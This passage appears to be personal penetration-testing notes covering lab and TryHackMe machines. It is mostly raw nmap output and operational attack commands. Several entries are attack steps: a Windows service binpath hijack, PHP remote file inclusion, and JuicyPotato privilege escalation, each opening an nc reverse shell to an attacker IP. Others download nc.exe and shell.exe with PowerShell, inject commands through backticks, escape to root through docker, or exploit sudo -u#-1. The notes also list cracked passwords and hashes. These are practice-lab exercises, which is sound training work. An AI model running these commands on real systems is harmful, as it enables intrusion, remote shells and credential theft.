SERVICE_ALL_ACCESS </code><br /><br /><br /><code># upnphost                  <br /><br />C:\&gt; sc qc upnphost<br /><br />[SC] GetServiceConfig SUCCESS<br />SERVICE_NAME: upnphost<br />        TYPE               : 20  WIN32_SHARE_PROCESS        START_TYPE         : 3   DEMAND_START        ERROR_CONTROL      : 1   NORMAL        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService        LOAD_ORDER_GROUP   :        TAG                : 0        DISPLAY_NAME       : Universal Plug and Play Device Host </code><code><span style="color:#ffff00;">DEPENDENCIES       : SSDPSRV</span></code><code>        SERVICE_START_NAME : NT AUTHORITY\LocalService           # SSDPSRV         <br />        <br />        <br /> C:\&gt; sc qc SSDPSRV<br /> [SC] GetServiceConfig SUCCESS<br /> <br /> SERVICE_NAME: SSDPSRV        TYPE               : 20  WIN32_SHARE_PROCESS  </code><code><span style="color:#ffff00;">START_TYPE         : 4   DISABLED</span></code><code>        ERROR_CONTROL      : 1   NORMAL        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService          LOAD_ORDER_GROUP   :           TAG                : 0          DISPLAY_NAME       : SSDP Discovery Service           DEPENDENCIES       :           SERVICE_START_NAME : NT AUTHORITY\LocalService</code><br /> <br /> <code># Query status        C:\&gt; sc query SSDPSRV<br /> <br /> SERVICE_NAME: SSDPSRV        TYPE               : 20  WIN32_SHARE_PROCESS         STATE              : 1  STOPPED                                 (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 1077       (0x435)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0        # Attempt to start the service                C:\&gt; net start SSDPSRVSystem error 1058 has occurred.The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.   </code><br /> <br /> <br /> <code># Set SSDPSRV to AUTOMATIC# NOTE: There is a space between = and auto. This is important, else the command will fail.                <br /> <br /> C:\&gt; sc config SSDPSRV start= auto<br /> <br /> [SC] ChangeServiceConfig SUCCESS        # Double check if it&#39;s set to AUTOMATIC (or AUTO_START)        C:\&gt; sc qc SSDPSRV[SC] GetServiceConfig SUCCESSSERVICE_NAME: SSDPSRV        TYPE               : 20  WIN32_SHARE_PROCESS         START_TYPE         : 2   AUTO_START        ERROR_CONTROL      : 1   NORMAL        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService          LOAD_ORDER_GROUP   :           TAG                : 0          DISPLAY_NAME       : SSDP Discovery Service           DEPENDENCIES       :           SERVICE_START_NAME : NT AUTHORITY\LocalService   </code><br /> <br /> <br /> <code>C:\&gt; net start SSDPSRV<br /> <br /> The SSDP Discovery Service service is starting.The SSDP Discovery Service service was started successfully. </code><br /> <br /> <br /> <code> Set new binary path (don&#39;t forget the space after binpath=)       # Syntax        <br />  <br />  C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe&quot;# ExampleC:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 192.168.0.2 4444 -e C:\WINDOWS\System32\cmd.exe&quot;        <br />  <br />  [SC] ChangeServiceConfig SUCCESS        <br />  # Set obj and password<br />  C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;[SC] ChangeServiceConfig SUCCESS     </code><br />  <br />  <code>C:\&gt; net start upnphost  </code><br />  <br />  <br />  <a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">https://sohvaxus.github.io/content/winxp-sp1-privesc.html</a><br />  <br />  <br /><br /></div><div class='page'><h1 class='title level-2'>10.11.1.8 - Alice</h1><br/><br /><a href="http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://192.168.119.182/simple.txt?">http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://192.168.119.182/simple.txt?</a><br /><br />simple.txt is php-reverse-shell<br /><br />config.php<br /><br />root<br />aCs2009offsec<br /><br />mysql creds are useless<br /><br />uname -a<br /><br /><a href="https://github.com/xiaoxiaoleo/CVE-2009-2698">https://github.com/xiaoxiaoleo/CVE-2009-2698</a><br /><br />exp<br /><br />whoami<br />root</div><div class='page'><h1 class='title level-2'>10.11.1.13 - Disco</h1><br/>FTP Anonymous login<br /><br />Upload aspx shell<br /><br />then upload nc and get a stable shell<br /><br /><a href="http://10.11.1.13:4167/shell.aspx?fdir=C%3a%2finetpub%2f%2fwwwroot">http://10.11.1.13:4167/shell.aspx?fdir=C%3a%2finetpub%2f%2fwwwroot</a><br /><br /><br />whoami /priv<br /><br />SeImpersonatePrivilege        Impersonate a client after authentication Enabled<br /><br />JuicyPotato<br /><br />there is a list of CLSIDs ( { F087771F-D74F-4C1A-BB8A-E16ACA9124EA} )try until one works  <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br /><br />nc.exe -e cmd.exe 192.168.119.232 443 &gt; esc.bat <br />esc.bat<br /><br />juice.exe -l 1337 -p esc.bat -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}</div><div class='page'><h1 class='title level-2'>10.11.1.31 - Ralph</h1><br/><br /><br />poiuytrewq<br /><br /><br /><code>powershell Invoke-WebRequest -Uri http://192.168.119.232/nc.exe -Outfile </code> nc.exe<br /><br /><code>powershell Invoke-WebRequest -Uri http://192.168.119.232/JuicyPotato.exe -Outfile </code> juice.exe<br /><br /><code>powershell Invoke-WebRequest -Uri http://192.168.119.232/shell.exe -Outfile </code> shell.exe<br /><br />juice.exe {BA126AD1-2166-11D1-B1D0-00805FC1270E}<br /><br />there is a list of CLSIDs ( { F087771F-D74F-4C1A-BB8A-E16ACA9124EA} )try until one works  <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br /><br />nc.exe -e cmd.exe 192.168.119.232 443 &gt; esc.bat <br />esc.bat<br /><br />juice.exe -l 1337 -p esc.bat -t * -c {BA126AD1-2166-11D1-B1D0-00805FC1270E}<br /><br />%temp%\juice.exe -l 1337 -p %temp%\esc.bat -t  * -c {FFE1E5FE-F1F0-48C8-953E-72BA272F2744}<br /><br /><br />juice.exe -l 1337 -p esc.bat -t  * -c {FFE1E5FE-F1F0-48C8-953E-72BA272F2744}<br /><br /><br /><br />juice.exe -l 1234 -p C:\temp\nc.exe -a &quot;<strong>-e</strong> cmd.exe 192.168.119.232 443&quot; -t * -c {FFE1E5FE-F1F0-48C8-953E-72BA272F2744}<br /><br />juice.exe -l 1234 -p shell.exe -t * -c {FFE1E5FE-F1F0-48C8-953E-72BA272F2744}<br /><br />network-secret.txt<br />7eab8563146f16140c769072580cbcb3</div><div class='page'><h1 class='title level-1'>THM Boxes</h1><br/></div><div class='page'><h1 class='title level-2'>chill hack.thm</h1><br/>                                                                                                                                                                                                                          <br />┌──(root💀kali)-[/home/kali]<br />└─# nmap -sV -T5 10.10.50.131<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-22 15:17 +03<br />Nmap scan report for 10.10.50.131<br />Host is up (0.083s latency).<br />Not shown: 997 closed ports<br />PORT   STATE SERVICE VERSION<br />21/tcp open  ftp     vsftpd 3.0.3<br />22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 12.46 seconds<br /><br /><br />anurodh:!d0ntKn0wmYp@ssw0rd <br /><br /><br />ssh -L 10000:127.0.0.1:9001 apaar@10.10.50.131 -i chillhack<br /><br />anurodh⇒ id ⇒ there is docker<br /><br />docker priv esc<br />docker images ⇒ alpine<br /><br />docker run -v /:/mnt --rm -it alpine chroot /mnt sh<br /><br /></div><div class='page'><h1 class='title level-2'>boiler ctf.thm</h1><br/>Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-15 18:26 +03<br />Stats: 0:01:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 22.44% done; ETC: 18:34 (0:06:34 remaining)<br />Stats: 0:06:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 83.50% done; ETC: 18:34 (0:01:23 remaining)<br />Nmap scan report for 10.10.113.19<br />Host is up (0.079s latency).<br />Not shown: 65531 closed ports<br />PORT      STATE SERVICE VERSION<br />21/tcp    open  ftp     vsftpd 3.0.3<br />|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to ::ffff:10.11.17.106<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      At session startup, client count was 3<br />|      vsFTPd 3.0.3 - secure, fast, stable<br />|_End of status<br />80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))<br />| http-robots.txt: 1 disallowed entry <br />|_/<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Apache2 Ubuntu Default Page: It works<br />10000/tcp open  http    MiniServ 1.930 (Webmin httpd)<br />|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).<br />55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)<br />|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)<br />|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/15%OT=21%CT=1%CU=42503%PV=Y%DS=2%DC=T%G=Y%TM=609FEA4<br />OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=105%TI=Z%CI=I%TS=8)SEQ(SP=FC<br />OS:%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=<br />OS:M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68<br />OS:DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7<br />OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=<br />OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%<br />OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0<br />OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP<br />OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 1720/tcp)<br />HOP RTT      ADDRESS<br />1   76.00 ms 10.11.0.1<br />2   84.55 ms 10.10.113.19<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 551.30 seconds<br /><br /><br />gobuster dir -u <a href="http://10.10.113.19/joomla/">http://10.10.113.19/joomla/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,txt,html -t 50<br /><br />basterd<br />superduperp@$$<br /><br />stoner<br />#superduperp@$$no1knows<br /><br />curl <a href="http://10.11.17.106/linpeas.sh">http://10.11.17.106/linpeas.sh</a> --output linpeas.sh</div><div class='page'><h1 class='title level-2'>ultratech.thm</h1><br/>└─# nmap -A -p- 10.10.229.77                                                                                                                         <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-20 21:08 +03<br />Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 77.76% done; ETC: 21:10 (0:00:29 remaining)<br />Stats: 0:02:32 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute<br />Traceroute Timing: About 32.26% done; ETC: 21:10 (0:00:02 remaining)<br />Nmap scan report for 10.10.229.77<br />Host is up (0.081s latency).<br />Not shown: 65531 closed ports<br />PORT      STATE SERVICE VERSION<br />21/tcp    open  ftp     vsftpd 3.0.3<br />22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)<br />|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)<br />|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)<br />8081/tcp  open  http    Node.js Express framework<br />|_http-cors: HEAD GET POST PUT DELETE PATCH<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).<br />31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/20%OT=21%CT=1%CU=43788%PV=Y%DS=2%DC=T%G=Y%TM=60A6A62<br />OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%TS=A)OPS(O1=M<br />OS:505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%<br />OS:O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%<br />OS:DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=<br />OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF<br />OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=<br />OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%<br />OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 554/tcp)<br />HOP RTT      ADDRESS<br />1   79.64 ms 10.11.0.1<br />2   80.68 ms 10.10.229.77<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 156.87 seconds<br /><br /><br /><a href="http://10.10.229.77:31331/partners.html">http://10.10.229.77:31331/partners.html</a><br /><br />backtick paramater:<br /><a href="http://10.10.229.77:8081/ping?ip=`cat%20utech.db.sqlite`">http://10.10.229.77:8081/ping?ip=`ls`</a><br /><br /><a href="http://10.10.229.77:8081/ping?ip=`cat%20utech.db.sqlite`">http://10.10.229.77:8081/ping?ip=`cat%20utech.db.sqlite`</a><br /><br />Mr00t:f357a0c52799563c7c7b76c1e7543a32:n100906<br />Madmin:0d0ea5111e3c1def594c1684e3b9be84:mrsheafy<br /><br />ssh r00t:n100906<br /><br /><strong>writable socket</strong><br />docker run -v /var/run/docker.sock:/ourdocker.sock:ro -it bash<br /><br />docker run -v /:/mnt --rm -it bash chroot /mnt s</div><div class='page'><h1 class='title level-2'>yearoftherabbit.thm</h1><br/>└─# nmap -A -p- 10.10.193.60   <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-19 00:17 +03<br />Stats: 0:06:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 83.36% done; ETC: 00:25 (0:01:20 remaining)<br />Stats: 0:07:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 96.79% done; ETC: 00:25 (0:00:16 remaining)<br />Stats: 0:07:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 98.92% done; ETC: 00:25 (0:00:05 remaining)<br />Stats: 0:08:27 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute<br />Traceroute Timing: About 32.26% done; ETC: 00:25 (0:00:00 remaining)<br />Nmap scan report for 10.10.193.60<br />Host is up (0.079s latency).<br />Not shown: 65532 closed ports<br />PORT   STATE SERVICE VERSION<br />21/tcp open  ftp     vsftpd 3.0.2<br />22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)<br />|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)<br />|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)<br />|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.10 ((Debian))<br />|_http-server-header: Apache/2.4.10 (Debian)<br />|_http-title: Apache2 Debian Default Page: It works<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/19%OT=21%CT=1%CU=36512%PV=Y%DS=2%DC=T%G=Y%TM=60A430E<br />OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)OPS(O1=M<br />OS:505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%<br />OS:O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%<br />OS:DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=<br />OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF<br />OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=<br />OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%<br />OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 3389/tcp)<br />HOP RTT      ADDRESS<br />1   77.12 ms 10.11.0.1<br />2   78.54 ms 10.10.193.60<br /><br /><br /><br /><br /><br /><a href="http://10.10.193.60/WExYY2Cv-qU/Hot_Babe.png">http://10.10.193.60/WExYY2Cv-qU/Hot_Babe.png</a><br /><br />[21][ftp] host: 10.10.193.60   login: ftpuser   password: 5iez1wGXKfPKQ<br /><br /><br />User: eli<br />Password: DSpDiM1wAEwid<br /><br /><br />&quot;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I&#39;ve left you a hidden message there&quot;<br /><br /><br />find / -name &quot;*s3cr3t*&quot; 2 &gt; /dev/null <br />Gwendoline<br />MniVCQVhQHUNI<br /><br /><br /><a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/</a><br /><br />sudo vuln<br />User gwendoline may run the following commands on year-of-the-rabbit:<br />    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt<br /><br /><br />sudo -u#-1 </div><div class='page'><h1 class='title level-2'>brainstrom_thm</h1><br/>└─# nmap -A 10.10.74.144 -p- -Pn<br />Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-12 17:23 +03<br />Nmap scan report for 10.10.74.144<br />Host is up (0.084s latency).<br />Not shown: 65533 filtered ports<br />PORT     STATE SERVICE VERSION<br />21/tcp   open  ftp     Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_Can&#39;t get directory listing: TIMEOUT<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />9999/tcp open  abyss?<br />| fingerprint-strings: <br />|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: <br />|     Welcome to Brainstorm chat (beta)<br />|     Please enter your username (max 20 characters): Write a message:<br />|   NULL: <br />|     Welcome to Brainstorm chat (beta)<br />|_    Please enter your username (max 20 characters):<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port9999-TCP:V=7.91%I=7%D=5/12%Time=609BE55B%P=x86_64-pc-linux-gnu%r(NU<br />SF:LL,52,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter<br />SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20&quot;)%r(GetRequest<br />SF:,63,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x<br />SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes<br />SF:sage:\x20&quot;)%r(HTTPOptions,63,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(<br />SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character<br />SF:s\):\x20Write\x20a\x20message:\x20&quot;)%r(FourOhFourRequest,63,&quot;Welcome\x2<br />SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern<br />SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;)%r(J<br />SF:avaRMI,63,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e<br />SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\<br />SF:x20message:\x20&quot;)%r(GenericLines,63,&quot;Welcome\x20to\x20Brainstorm\x20cha<br />SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch<br />SF:aracters\):\x20Write\x20a\x20message:\x20&quot;)%r(RTSPRequest,63,&quot;Welcome\x<br />SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user<br />SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;)%r(<br />SF:RPCCheck,63,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2<br />SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20<br />SF:a\x20message:\x20&quot;)%r(DNSVersionBindReqTCP,63,&quot;Welcome\x20to\x20Brainst<br />SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x<br />SF:2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;)%r(DNSStatusReques<br />SF:tTCP,63,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent<br />SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2<br />SF:0message:\x20&quot;)%r(Help,63,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(bet<br />SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)<br />SF::\x20Write\x20a\x20message:\x20&quot;)%r(SSLSessionReq,63,&quot;Welcome\x20to\x20<br />SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20<br />SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;)%r(Terminal<br />SF:ServerCookie,63,&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas<br />SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write<br />SF:\x20a\x20message:\x20&quot;);<br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />Device type: general purpose|phone|specialized<br />Running (JUST GUESSING): Microsoft Windows 2008|Phone|8.1|7|Vista (90%)<br />OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1<br />Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Server 2008 R2 (89%)<br />No exact OS matches for host (test conditions non-ideal).<br />Network Distance: 2 hops<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />TRACEROUTE (using port 21/tcp)<br />HOP RTT      ADDRESS<br />1   82.81 ms 10.11.0.1<br />2   84.89 ms 10.10.74.144<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 322.71 seconds<br /><br /><br /><br />ftp anonymous<br />binary<br /><br /><strong>binary (ftp binary mode just type binary in ftp cmd) is important, otherwise you cant get the file properly!!!</strong><br /></div><div class='page'><h1 class='title level-2'>gatekeeper.thm</h1><br/>└─# nmap -A 10.10.80.155 -p-<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-12 19:31 +03<br />Nmap scan report for 10.10.80.155<br />Host is up (0.075s latency).<br />Not shown: 65526 closed ports<br />PORT      STATE SERVICE     VERSION<br />135/tcp   open  msrpc       Microsoft Windows RPC<br />139/tcp   open  netbios-ssn Windows 7 Professional 7601 Service Pack 1 netbios-ssn<br />31337/tcp open  Elite?<br />| fingerprint-strings: <br />|   FourOhFourRequest: <br />|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0<br />|     Hello<br />|   GenericLines: <br />|     Hello <br />|     Hello<br />|   GetRequest: <br />|     Hello GET / HTTP/1.0<br />|     Hello<br />|   HTTPOptions: <br />|     Hello OPTIONS / HTTP/1.0<br />|     Hello<br />|   Help: <br />|     Hello HELP<br />|   Kerberos: <br />|     Hello !!!<br />|   LDAPSearchReq: <br />|     Hello 0<br />|     Hello<br />|   LPDString: <br />|     Hello <br />|     default!!!<br />|   RTSPRequest: <br />|     Hello OPTIONS / RTSP/1.0<br />|     Hello<br />|   SIPOptions: <br />|     Hello OPTIONS sip:nm SIP/2.0<br />|     Hello Via: SIP/2.0/TCP nm;branch=foo<br />|     Hello From: &lt;sip:nm@nm&gt;;tag=root<br />|     Hello To: &lt;sip:nm2@nm2&gt;<br />|     Hello Call-ID: 50000<br />|     Hello CSeq: 42 OPTIONS<br />|     Hello Max-Forwards: 70<br />|     Hello Content-Length: 0<br />|     Hello Contact: &lt;sip:nm@nm&gt;<br />|     Hello Accept: application/sdp<br />|     Hello<br />|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: <br />|_    Hello<br />49152/tcp open  msrpc       Microsoft Windows RPC<br />49153/tcp open  msrpc       Microsoft Windows RPC<br />49154/tcp open  msrpc       Microsoft Windows RPC<br />49155/tcp open  msrpc       Microsoft Windows RPC<br />49161/tcp open  msrpc       Microsoft Windows RPC<br />49162/tcp open  msrpc       Microsoft Windows RPC<br />1 service 